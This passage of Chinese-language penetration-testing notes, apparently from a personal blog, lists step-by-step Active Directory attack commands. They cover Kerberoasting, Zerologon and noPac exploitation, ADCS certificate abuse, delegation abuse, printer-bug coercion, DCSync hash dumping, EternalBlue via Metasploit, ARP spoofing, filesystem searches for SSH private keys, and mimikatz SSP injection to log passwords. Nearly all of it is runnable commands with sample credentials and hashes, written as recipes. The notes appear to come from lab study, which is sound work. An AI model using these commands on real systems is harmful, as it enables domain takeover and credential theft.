<li>mimikatz kerberos::ptt C:\Users\webadmin\Desktop[0;22d3a]<a href="mailto:&#45;&#x32;&#x2d;&#49;&#x2d;&#x34;&#x30;&#101;&#48;&#x30;&#48;&#x30;&#x30;&#45;&#65;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#114;&#97;&#x74;&#x6f;&#x72;&#x40;&#x6b;&#114;&#98;&#116;&#103;&#x74;&#45;&#103;&#111;&#100;&#x2e;&#111;&#x72;&#103;&#46;&#107;&#x69;&#x72;&#x62;&#105;">&#45;&#x32;&#x2d;&#49;&#x2d;&#x34;&#x30;&#101;&#48;&#x30;&#48;&#x30;&#x30;&#45;&#65;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#114;&#97;&#x74;&#x6f;&#x72;&#x40;&#x6b;&#114;&#98;&#116;&#103;&#x74;&#45;&#103;&#111;&#100;&#x2e;&#111;&#x72;&#103;&#46;&#107;&#x69;&#x72;&#x62;&#105;</a></li>
</ul>
</li>
<li>查看票据<ul>
<li>shell klist</li>
</ul>
</li>
<li>利用票据连接<ul>
<li>shell dir \owa2010cn-god\c$</li>
</ul>
</li>
</ul>
</li>
<li><p>Rubeus-利用通讯的加密类型票据进行爆破明文</p>
<ul>
<li><p>Kerberos攻击条件：</p>
<ul>
<li><p>采用<strong>rc4</strong>加密类型票据，使用工具Rubeus&amp;impacket检测或看票据加密类型</p>
</li>
<li><p>Kerberoasting 攻击的利用：</p>
<p>•SPN服务发现</p>
<p>•请求服务票据</p>
<p>•服务票据的导出</p>
<p>•服务票据的暴力破解</p>
</li>
</ul>
</li>
<li><p>具体利用</p>
<ul>
<li><p>1、扫描：</p>
<p>powershell setspn -T 0day.org -q <em>&#x2F;</em></p>
<p>powershell setspn -T 0day.org -q <em>&#x2F;</em> | findstr “MSSQL”</p>
<p>2、检测加请求：</p>
<p>Rubeus kerberoast</p>
<p>impacket-getuserspns</p>
<p>请求所有SPN服务器，并找到能破解的票据格式保存到hash.txt</p>
<p>python GetUserSPNs.py -request -dc-ip 192.168.3.142 0day.org&#x2F;jack:admin!@#45 -outputfile hash.txt</p>
<p>3.手工请求：（要产生票据文件）</p>
<p>powershell Add-Type -AssemblyName System.IdentityModel</p>
<p>powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc&#x2F;Srv-DB-0day.0day.org:1433”</p>
<p>mimikatz kerberos::ask &#x2F;target:MSSQLSvc&#x2F;SqlServer.god.org:1433</p>
<p>4.导出：</p>
<p>mimikatz kerberos::list &#x2F;export</p>
<p>5.破解：</p>
<p>文件票据：python tgsrepcrack.py pass.txt “xx.kirbi”</p>
<p>HASH密文：hashcat -m 13100 hash.txt pass.txt –force</p>
<p>5.重写：(后续讲到)</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/174967.html">https://www.freebuf.com/articles/system/174967.html</a></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="ptk（密钥传递攻击）"><a href="#ptk（密钥传递攻击）" class="headerlink" title="ptk（密钥传递攻击）"></a>ptk（密钥传递攻击）</h4><ul>
<li><p>条件</p>
<ul>
<li>PTK &#x3D; Pass The Key，当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash也就失去了作用，但是可以通过PTK的攻击方式获得权限。</li>
</ul>
</li>
<li><p>命令</p>
<p>mimikatz sekurlsa::ekeys</p>
<p>mimikatz sekurlsa::pth &#x2F;user:域用户名 &#x2F;domain:域名 &#x2F;aes256:aes256值</p>
</li>
</ul>
<h3 id="基于漏洞"><a href="#基于漏洞" class="headerlink" title="基于漏洞"></a>基于漏洞</h3><h4 id="NTML-Relay"><a href="#NTML-Relay" class="headerlink" title="NTML Relay"></a>NTML Relay</h4><ul>
<li>流程<ul>
<li><strong>捕获</strong>Net-NTML Hash数据<ul>
<li>强制请求漏洞</li>
<li>被动钓鱼：文件、网页、命令</li>
</ul>
</li>
<li><strong>重放</strong>脚本攻击主机<ul>
<li>攻击失败则暴力<strong>破解</strong>Net-NTML Hash以备后续</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="域控提权漏洞"><a href="#域控提权漏洞" class="headerlink" title="域控提权漏洞"></a>域控提权漏洞</h4><h5 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h5><ul>
<li>获得计算机名<ul>
<li>net group “domain controllers” &#x2F;domain</li>
</ul>
</li>
<li>Socks代理<ul>
<li>修改Hosts绑定域名和IP</li>
</ul>
</li>
<li>连接DC清空凭证<ul>
<li>python cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</li>
</ul>
</li>
<li>获取域内HASH（无凭证）-impacket<ul>
<li>python secretsdump.py “god.org&#x2F;owa2010cn-god$@192.168.3.21” -no-pass</li>
</ul>
</li>
<li>PTH连接域控-impacket<ul>
<li>python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#116;&#x6f;&#114;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#x33;&#x2e;&#50;&#x31;">&#x61;&#x64;&#x6d;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#116;&#x6f;&#114;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#x33;&#x2e;&#50;&#x31;</a></li>
</ul>
</li>
<li>真实环境还有恢复密码</li>
</ul>
<h5 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h5><ul>
<li>Socks代理<ul>
<li>修改Hosts绑定域名和IP</li>
</ul>
</li>
<li>noPac-python<ul>
<li>python noPac.py -use-ldap “god.org&#x2F;webadmin:admin!@#45” -dc-ip 192.168.3.21 -shell</li>
</ul>
</li>
<li>sam-python（linux）-修改proxychains绑定socks代理<ul>
<li>proxychains4 python sam_the_admin.py god&#x2F;‘webadmin:admin!@#45’ -dc-ip 192.168.3.21 -shell</li>
</ul>
</li>
</ul>
<h5 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h5><ul>
<li><p>原理：Windows系统的Active Directory证书服务（CS）在域上运行</p>
</li>
<li><p>前提</p>
<ul>
<li>一个域内普通账号</li>
<li>域内存在证书服务器</li>
</ul>
</li>
<li><p>利用</p>
<ul>
<li><p>CS中获取CA结构名和计算机名</p>
<p>shell certutil</p>
<p>powershell Get-ChildItem Cert:\LocalMachine\Root\</p>
</li>
<li><p>申请低权限用户证书-certipy 3版本，使用kali2022及以下</p>
<ul>
<li>certipy req ‘xiaodi.lab&#x2F;test:<a href="mailto:&#80;&#97;&#x73;&#115;&#49;&#50;&#51;&#x40;&#x64;&#99;&#46;&#120;&#x69;&#x61;&#x6f;&#100;&#x69;&#x2e;&#108;&#x61;&#x62;">&#80;&#97;&#x73;&#115;&#49;&#50;&#51;&#x40;&#x64;&#99;&#46;&#120;&#x69;&#x61;&#x6f;&#100;&#x69;&#x2e;&#108;&#x61;&#x62;</a>‘ -ca xiaodi-DC-CA -template User -debug</li>
</ul>
</li>
<li><p>检测证书</p>
<ul>
<li>certipy auth -pfx test.pfx -dc-ip 192.168.3.111</li>
</ul>
</li>
<li><p>创建机器账户</p>
<ul>
<li>python3 bloodyAD.py -d xiaodi.lab -u test -p ‘Pass123’ –host 192.168.3.111 addComputer machine_account ‘machine_pass*’</li>
</ul>
</li>
<li><p>设置机器账号属性（dNSHostName和DC一致）</p>
<ul>
<li>python3 bloodyAD.py -d xiaodi.lab -u test -p ‘Pass123’ –host 192.168.3.111 setAttribute ‘CN&#x3D;pwnmachine,CN&#x3D;Computers,DC&#x3D;xiaodi,DC&#x3D;lab’ dNSHostName ‘[“DC.xiaodi.lab”]’</li>
</ul>
</li>
<li><p>再次申请证书</p>
<ul>
<li>certipy req ‘xiaodi.lab&#x2F;pwnmachine$:CVEPassword1234*@192.168.3.111’ -template Machine -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -debug</li>
</ul>
</li>
<li><p>检测证书</p>
<ul>
<li>certipy auth -pfx .&#x2F;dc.pfx -dc-ip 192.168.3.111</li>
</ul>
</li>
<li><p>导出HASH</p>
<ul>
<li>python3 secretsdump.py ‘xiaodi.lab&#x2F;dc$@DC.xiaodi.lab’ -hashes :10e02bef2258ad9b239e2281a01827a4</li>
</ul>
</li>
<li><p>利用HASH</p>
<ul>
<li>python3 wmiexec.py xiaodi.lab&#x2F;<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#110;&#x69;&#115;&#116;&#x72;&#97;&#x74;&#x6f;&#114;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#51;&#46;&#49;&#49;&#x31;">&#x61;&#100;&#x6d;&#x69;&#110;&#x69;&#115;&#116;&#x72;&#97;&#x74;&#x6f;&#114;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#51;&#46;&#49;&#49;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="CVE-2017-0146"><a href="#CVE-2017-0146" class="headerlink" title="CVE-2017-0146"></a>CVE-2017-0146</h5><ul>
<li><p>cs联动msf-设置监听器，msf监听，cs使用命令spawn cs-&gt;msf发送给msf</p>
<p><img src="/.com//Users\85885\Documents\web\笔记\截图\Snipaste_2024-07-03_21-22-40.png" alt="Snipaste_2024-07-03_21-22-40"></p>
</li>
<li><p>msf监听</p>
<ul>
<li><p>use exploit&#x2F;multi&#x2F;handler</p>
<p>set payload windows&#x2F;meterpreter&#x2F;reverse_http</p>
<p>set lhost 0.0.0.0</p>
<p>set lport 4444</p>
</li>
</ul>
</li>
<li><p>添加路由</p>
<ul>
<li>run post&#x2F;multi&#x2F;manage&#x2F;autoroute &#x2F;&#x2F;添加当前路由表</li>
<li>run autoroute -p &#x2F;&#x2F;查看当前路由表</li>
</ul>
</li>
<li><p>利用模块</p>
<ul>
<li><p>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p>
<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp &#x2F;&#x2F;正向连接上线</p>
</li>
<li><p>分别设置rhosts和rhost为目标ip</p>
</li>
</ul>
</li>
</ul>
<h4 id="Exchange服务漏洞"><a href="#Exchange服务漏洞" class="headerlink" title="Exchange服务漏洞"></a>Exchange服务漏洞</h4><ul>
<li><p>信息收集</p>
<ul>
<li>端口扫描-25&#x2F;587&#x2F;2525</li>
<li>SPN扫描<ul>
<li>powershell setspn -T 0day.org -q <em>&#x2F;</em></li>
</ul>
</li>
<li>脚本探针<ul>
<li>python Exchange_GetVersion_MatchVul.py 192.168.3.142</li>
</ul>
</li>
</ul>
</li>
<li><p>有凭据（账号密码）利用</p>
<ul>
<li>钓鱼</li>
<li>CVE-2020-0688<ul>
<li>前提：Exchange Server 2010 SP3&#x2F;2013&#x2F;2016&#x2F;2019</li>
<li>使用：<ul>
<li>获得凭据</li>
<li>使用脚本：python cve-2020-0688.py 192.168.3.144 <a href="mailto:&#x6d;&#105;&#x63;&#108;&#101;&#64;&#x72;&#x6f;&#x6f;&#x74;&#107;&#105;&#116;&#x2e;&#111;&#x72;&#103;">&#x6d;&#105;&#x63;&#108;&#101;&#64;&#x72;&#x6f;&#x6f;&#x74;&#107;&#105;&#116;&#x2e;&#111;&#x72;&#103;</a> Admin12345 calc</li>
<li>利用ysoserial使用命令生成反序列化命令</li>
<li>将命令继续在cve-2020-0688.py使用，进行远程反序列化</li>
</ul>
</li>
</ul>
</li>
<li>CVE-2020-17144<ul>
<li>前提：只能<strong>Exchange2010</strong>能用</li>
<li>使用<ul>
<li>获得凭据</li>
<li>使用脚本：CVE-2020-17144.exe OWA2010SP3.0day.org jack admin!@#45</li>
<li>会在目标文件夹生成相应的木马文件</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>无凭据利用</p>
<ul>
<li>暴力破解</li>
</ul>
</li>
<li><p>ProxyShell 漏洞利用链</p>
<ul>
<li><p>CVE-2021-34473 Microsoft Exchange ACL绕过漏洞</p>
<p>CVE-2021-34523 Microsoft Exchange权限提升漏洞</p>
<p>CVE-2021-31207 Microsoft Exchange授权任意文件写入漏洞。</p>
</li>
</ul>
</li>
</ul>
<h3 id="基于配置"><a href="#基于配置" class="headerlink" title="基于配置"></a>基于配置</h3><h4 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h4><ul>
<li><p>配置前提</p>
<ul>
<li>委派</li>
<li>如无委派可用命令setspn -U -A priv&#x2F;test 用户名</li>
</ul>
<p><img src="/.com//Users\85885\Documents\web\笔记\截图\Snipaste_2024-06-19_22-22-29.png" alt="Snipaste_2024-06-19_22-22-29"></p>
</li>
</ul>
<h5 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h5><ul>
<li><p>委派判断</p>
<ul>
<li><p>查询域内设置了非约束委派的服务账户：</p>
<p>AdFind -b “DC&#x3D;god,DC&#x3D;org”（域控名） -f “(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))” dn</p>
</li>
<li><p>查询域内设置了非约束委派的机器账户:</p>
<p>AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))” dn</p>
</li>
</ul>
</li>
<li><p>利用思路</p>
<ul>
<li><p>诱使管理员访问受控机-留下域控的信息痕迹</p>
<ul>
<li><p>利用前提</p>
<ul>
<li><p>需要Administrator权限</p>
<p>域内主机的机器账户开启非约束委派</p>
<p>域控管理员远程访问（主动或被动）</p>
</li>
</ul>
</li>
<li><p>利用方法</p>
<ul>
<li>域控主机主动触发：net use \webserver</li>
<li>被控机钓鱼触发</li>
</ul>
</li>
<li><p>具体步骤</p>
<ul>
<li><p>导出票据到被控机</p>
<p>mimikatz sekurlsa::tickets &#x2F;export</p>
</li>
<li><p>导入票据到内存</p>
<p>mimikatz kerberos::ptt 前缀<a href="mailto:&#45;&#x41;&#x64;&#109;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#x72;&#x40;&#x6b;&#x72;&#98;&#116;&#103;&#x74;&#x2d;&#x47;&#79;&#x44;&#46;&#79;&#82;&#71;&#46;&#x6b;&#105;&#x72;&#x62;&#x69;">&#45;&#x41;&#x64;&#109;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#x72;&#x40;&#x6b;&#x72;&#98;&#116;&#103;&#x74;&#x2d;&#x47;&#79;&#x44;&#46;&#79;&#82;&#71;&#46;&#x6b;&#105;&#x72;&#x62;&#x69;</a></p>
</li>
<li><p>连接域控</p>
<p>shell dir \域控名-域名\c$</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>打印机漏洞</p>
<ul>
<li><p>利用条件</p>
<ul>
<li><p>DC 2012以上</p>
<p>Administrator权限监听</p>
<p>打印机服务spooler开启（默认开启）</p>
</li>
</ul>
</li>
<li><p>具体利用</p>
<ul>
<li><p>监听来自DC的请求数据并保存文件</p>
<p>shell Rubeus.exe monitor &#x2F;interval:2 &#x2F;filteruser:dc$ &gt;hash.txt</p>
<p>域用户运行SpoolSample强制让DC请求</p>
<p>shell SpoolSample.exe dc web2016</p>
</li>
<li><p>Rubeus监听到票据并导入该票据</p>
<p>shell Rubeus.exe ptt &#x2F;ticket:xxx</p>
</li>
<li><p>使用mimikatz导出域内Hash</p>
<p>mimikatz lsadump::dcsync &#x2F;domain:xiaodi8.com &#x2F;all &#x2F;csv</p>
</li>
<li><p>使用wmi借助hash横向移动</p>
<p>python wmiexec.py -hashes :0b17b318cd59bb4e90f5a528437481a9 xiaodi8.com&#x2F;<a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#105;&#115;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#x64;&#99;&#x2e;&#x78;&#x69;&#97;&#x6f;&#100;&#105;&#x38;&#46;&#x63;&#x6f;&#x6d;">&#97;&#100;&#x6d;&#105;&#x6e;&#105;&#115;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#x64;&#99;&#x2e;&#x78;&#x69;&#97;&#x6f;&#100;&#105;&#x38;&#46;&#x63;&#x6f;&#x6d;</a> -no-pass</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>结合PetiPotam</p>
</li>
</ul>
</li>
</ul>
<h5 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h5><ul>
<li><p>委派判断</p>
<ul>
<li><p>查询机器用户（主机）配置约束委派</p>
<p>AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))” msds-allowedtodelegateto</p>
</li>
<li><p>查询服务账户（主机）配置约束委派</p>
<p>AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))” msds-allowedtodelegateto</p>
</li>
</ul>
</li>
<li><p>漏洞配置</p>
<ul>
<li>机器设置仅信任此计算机指定服务-cifs</li>
<li>用户设置仅信任此计算机指定服务-cifs</li>
</ul>
</li>
<li><p>利用思路：使用机器账号票据</p>
</li>
<li><p>利用前提</p>
<ul>
<li><p>kekeo Rubeus getST</p>
</li>
<li><p>需要Administrator权限</p>
<p>目标机器账户配置了约束性委派</p>
</li>
</ul>
</li>
<li><p>利用方法-kekeo需在受控机落地，其他的域名、密码等需要修改</p>
<ul>
<li><p>获取webadmin用户的票据</p>
<p>kekeo “tgt::ask &#x2F;user:webadmin &#x2F;domain:god.org &#x2F;password::admin!@#45 &#x2F;ticket:administrator.kirbi” “exit”</p>
<p>kekeo “tgt::ask &#x2F;user:webadmin &#x2F;domain:god.org &#x2F;NTLM:518b98ad4178a53695dc997aa02d455c &#x2F;ticket:administrator.kirbi” “exit”</p>
</li>
<li><p>利用webadmin用户票据请求获取域控票据</p>
<p>kekeo “tgs::s4u &#x2F;tgt:<a href="mailto:&#x54;&#71;&#x54;&#x5f;&#119;&#101;&#98;&#x61;&#100;&#x6d;&#105;&#x6e;&#x40;&#71;&#79;&#x44;&#46;&#x4f;&#82;&#x47;&#95;&#107;&#114;&#x62;&#x74;&#103;&#x74;">&#x54;&#71;&#x54;&#x5f;&#119;&#101;&#98;&#x61;&#100;&#x6d;&#105;&#x6e;&#x40;&#71;&#79;&#x44;&#46;&#x4f;&#82;&#x47;&#95;&#107;&#114;&#x62;&#x74;&#103;&#x74;</a>~<a href="mailto:&#103;&#x6f;&#100;&#46;&#111;&#114;&#103;&#x40;&#71;&#79;&#68;&#x2e;&#79;&#82;&#x47;&#x2e;&#x6b;&#x69;&#114;&#x62;&#x69;">&#103;&#x6f;&#100;&#46;&#111;&#114;&#103;&#x40;&#71;&#79;&#68;&#x2e;&#79;&#82;&#x47;&#x2e;&#x6b;&#x69;&#114;&#x62;&#x69;</a> &#x2F;user:<a href="mailto:&#x41;&#100;&#x6d;&#x69;&#110;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#x72;&#64;&#103;&#111;&#x64;&#x2e;&#111;&#x72;&#103;">&#x41;&#100;&#x6d;&#x69;&#110;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#x72;&#64;&#103;&#111;&#x64;&#x2e;&#111;&#x72;&#103;</a> &#x2F;service:cifs&#x2F;owa2010cn-god” “exit”</p>
<p>kekeo “tgs::s4u &#x2F;tgt:<a href="mailto:&#84;&#71;&#x54;&#x5f;&#119;&#101;&#x62;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x47;&#79;&#68;&#46;&#x4f;&#82;&#71;&#x5f;&#x6b;&#x72;&#98;&#116;&#103;&#116;">&#84;&#71;&#x54;&#x5f;&#119;&#101;&#x62;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x47;&#79;&#68;&#46;&#x4f;&#82;&#71;&#x5f;&#x6b;&#x72;&#98;&#116;&#103;&#116;</a>~<a href="mailto:&#103;&#x6f;&#x64;&#46;&#111;&#x72;&#103;&#64;&#x47;&#x4f;&#68;&#46;&#x4f;&#x52;&#x47;&#x2e;&#x6b;&#105;&#114;&#x62;&#x69;">&#103;&#x6f;&#x64;&#46;&#111;&#x72;&#103;&#64;&#x47;&#x4f;&#68;&#46;&#x4f;&#x52;&#x47;&#x2e;&#x6b;&#105;&#114;&#x62;&#x69;</a> &#x2F;user:<a href="mailto:&#x41;&#100;&#x6d;&#105;&#110;&#105;&#115;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#64;&#x67;&#x6f;&#100;&#46;&#x6f;&#114;&#103;">&#x41;&#100;&#x6d;&#105;&#110;&#105;&#115;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#64;&#x67;&#x6f;&#100;&#46;&#x6f;&#114;&#103;</a> &#x2F;service:cifs&#x2F;owa2010cn-god.god.org” “exit”</p>
</li>
<li><p>导入票据到内存</p>
<p><img src="/.com//Users\85885\Documents\web\笔记\截图\Snipaste_2024-06-19_23-53-06.png" alt="Snipaste_2024-06-19_23-53-06"></p>
<p>mimikatz kerberos::ptt <a href="mailto:&#x54;&#x47;&#83;&#95;&#x41;&#x64;&#109;&#105;&#x6e;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#103;&#x6f;&#x64;&#46;&#x6f;&#114;&#103;">&#x54;&#x47;&#83;&#95;&#x41;&#x64;&#109;&#105;&#x6e;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#103;&#x6f;&#x64;&#46;&#x6f;&#114;&#103;</a>@GOD.ORG_cifs~<a href="mailto:&#111;&#119;&#x61;&#50;&#48;&#x31;&#x30;&#99;&#x6e;&#x2d;&#x67;&#111;&#x64;&#46;&#103;&#111;&#x64;&#46;&#x6f;&#x72;&#x67;&#64;&#71;&#79;&#68;&#46;&#x4f;&#82;&#71;&#x2e;&#107;&#x69;&#x72;&#98;&#105;">&#111;&#119;&#x61;&#50;&#48;&#x31;&#x30;&#99;&#x6e;&#x2d;&#x67;&#111;&#x64;&#46;&#103;&#111;&#x64;&#46;&#x6f;&#x72;&#x67;&#64;&#71;&#79;&#68;&#46;&#x4f;&#82;&#71;&#x2e;&#107;&#x69;&#x72;&#98;&#105;</a></p>
</li>
<li><p>连接通讯域控</p>
<p>shell dir \owa2010cn-god\c$</p>
</li>
</ul>
</li>
</ul>
<h5 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h5><h6 id="同用户不同机器"><a href="#同用户不同机器" class="headerlink" title="同用户不同机器"></a>同用户不同机器</h6><ul>
<li><p>利用条件-SID值相同</p>
<ul>
<li><p>查询被域用户创建的机器账户列表:</p>
<p>shell AdFind.exe -b “DC&#x3D;xiaodi,DC&#x3D;local” -f “(&amp;(samAccountType&#x3D;805306369))” cn mS-DS-CreatorSID</p>
<p>根据查询出来的sid找出对应的用户名：</p>
<p>shell AdFind.exe -b “DC&#x3D;xiaodi,DC&#x3D;local” -f “(&amp;(objectsid&#x3D;S-1-5-21-1695257952-3088263962-2055235443-1104))” objectclass cn dn</p>
</li>
</ul>
</li>
<li><p>具体利用</p>
<ul>
<li><p>增加机器用户-申请票据</p>
<ul>
<li><p># 使用addcpmputer创建机器账户</p>
<p>python addcomputer.py xiaodi8.com&#x2F;web2016:Xiaodi12345 -method LDAPS -computer-name test01$ -computer-pass Passw0rd -dc-ip 192.168.139.11</p>
<p># 使用bloodyAD工具创建机器账户</p>
<p>python bloodyAD.py -d redteam.lab -u web2016 -p ‘Xiaodi12345’ –host 192.168.139.11 addComputer test01 ‘Passw0rd’</p>
<p># 使用PowerMad工具创建机器账户</p>
<p>powershell Set-ExecutionPolicy Bypass -Scope Process</p>
<p>powershell Import-Module .\Powermad.ps1;New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString “123456” -AsPlainText -Force)</p>
</li>
</ul>
</li>
<li><p>修改委派属性</p>
<ul>
<li><p>修改目标主机的资源委派属性（data）</p>
<p>msds-allowedtoactonbehalfofotheridentity</p>
<p>获取新增账户的objectsid</p>
<p>powershell Import-Module .\PowerView.ps1;Get-NetComputer serviceA -Properties objectsid</p>
<p>修改datax主机委派属性：</p>
<p>powershell import-module .\powerview.ps1;$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList “O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1124)”;$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer datax| Set-DomainObject -Set @{‘msds-allowedtoactonbehalfofotheridentity’&#x3D;$SDBytes} -Verbose</p>
<p>验证和清除委派属性：</p>
<p>powershell import-module .\powerview.ps1;Get-DomainComputer data -Properties msds-allowedtoactonbehalfofotheridentity</p>
<p>powershell import-module .\powerview.ps1;Set-DomainObject data -Clear ‘msds-allowedtoactonbehalfofotheridentity’ -Verbose</p>
</li>
</ul>
</li>
<li><p>请求票据导入利用</p>
<ul>
<li><p>利用serviceA申请访问data主机cifs服务票据：</p>
<p>python getST.py -dc-ip 192.168.3.33 xiaodi.local&#x2F;serviceA$:123456 -spn cifs&#x2F;datax.xiaodi.local -impersonate administrator</p>
<p>导入票据到内存：</p>
<p>mimikatz kerberos::ptc administrator.ccache</p>
<p>连接利用票据：</p>
<p>shell dir \data.xiaodi.local\c$</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="Acount-Operators组用户"><a href="#Acount-Operators组用户" class="headerlink" title="Acount Operators组用户"></a>Acount Operators组用户</h6><ul>
<li><p>利用条件-获得组内用户账号</p>
<ul>
<li><p>查询Acount Operators组成员：</p>
<p>shell adfind.exe -h 192.168.3.33:389 -s subtree -b CN&#x3D;”Account Operators”,CN&#x3D;Builtin,DC&#x3D;xiaodi,DC&#x3D;local member</p>
</li>
</ul>
</li>
<li><p>具体利用同上</p>
</li>
</ul>
<h6 id="结合HTLMRelay"><a href="#结合HTLMRelay" class="headerlink" title="结合HTLMRelay"></a>结合HTLMRelay</h6><ul>
<li><p>利用思路：</p>
<ul>
<li>绕过NTLM MIC校验+打印机漏洞+NTLM Relay+基于资源的约束性委派组合攻击</li>
</ul>
</li>
<li><p>利用条件：</p>
<ul>
<li><p>能创建机器账户</p>
</li>
<li><p>目标开启打印机服务</p>
</li>
</ul>
</li>
</ul>
<h4 id="dysnc"><a href="#dysnc" class="headerlink" title="dysnc"></a>dysnc</h4><h4 id="asreo"><a href="#asreo" class="headerlink" title="asreo"></a>asreo</h4><h4 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h4><h3 id="工作组-1"><a href="#工作组-1" class="headerlink" title="工作组"></a>工作组</h3><ul>
<li>ARP欺骗<ul>
<li>单向欺骗断网<ul>
<li>目的：目标机IP（arp -a）和MAC地址</li>
<li>源：目标网关IP和随意MAC地址</li>
</ul>
</li>
<li>双写欺骗绕过绑定断网<ul>
<li>第一个arp包<ul>
<li>目的：目标机IP和MAC地址</li>
<li>源：目标网关IP和攻击机MAC地址（ipconfig &#x2F;all）</li>
</ul>
</li>
<li>第二个arp包<ul>
<li>目的：目标网关IP和MAC地址</li>
<li>源：目标机IP和攻击机MAC地址</li>
</ul>
</li>
</ul>
</li>
<li>双写欺骗绕过截取数据<ul>
<li>arpspoof.exe 192.168.1.8（目标IP，此处为手机IP）</li>
<li>然后即可获取目标数据流量</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
<li><p>爆破密钥</p>
</li>
<li><p>获取密钥</p>
<ul>
<li><p>查看敏感文件</p>
<p>~&#x2F;.ssh&#x2F;config #配置 ssh 连接相关参数的配置文件</p>
<p>~&#x2F;.ssh&#x2F;known_hosts  # 该服务器所有登录过的服务器的信息</p>
<p>~&#x2F;.bash_history # 通过历史命令看该服务器中有没有使用ssh私钥去连接服务器</p>
</li>
<li><p>搜索含有SSH凭证文件</p>
<p>grep -ir “BEGIN RSA PRIVATE KEY” &#x2F;*</p>
<p>grep -ir “BEGIN DSA PRIVATE KEY” &#x2F;*</p>
<p>grep -ir “BEGIN OPENSSH PRIVATE KEY” &#x2F;*</p>
</li>
</ul>
</li>
<li><p>寻找密钥对文件：</p>
<p>通过<strong>历史命令</strong>看看有没有连接过主机采用的文件</p>
<p>通过<strong>搜索内容</strong>查看哪些符合密钥对文件的特征</p>
<p>通过查看<strong>敏感文件</strong>中的配置型信息获取文件</p>
</li>
</ul>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="内网AD域"><a href="#内网AD域" class="headerlink" title="内网AD域"></a>内网AD域</h3><h4 id="SSP注入"><a href="#SSP注入" class="headerlink" title="SSP注入"></a>SSP注入</h4><ul>
<li><p>AD域</p>
<ul>
<li><p>privilege::debug</p>
</li>
<li><p>misc::memssp</p>
</li>
</ul>
</li>
<li><p>查看账号密码</p>
<ul>
<li>C:\Windows\System32\mimilsa.log 记录登录的账号密码</li>
</ul>
</li>
<li><p>技术总结：</p>
<p>攻防实战中，靶机很难会重启，攻击者重启的话风险过大，</p>
<p>因此可以在靶机上把两个方法相互结合起来使用效果比较好，</p>
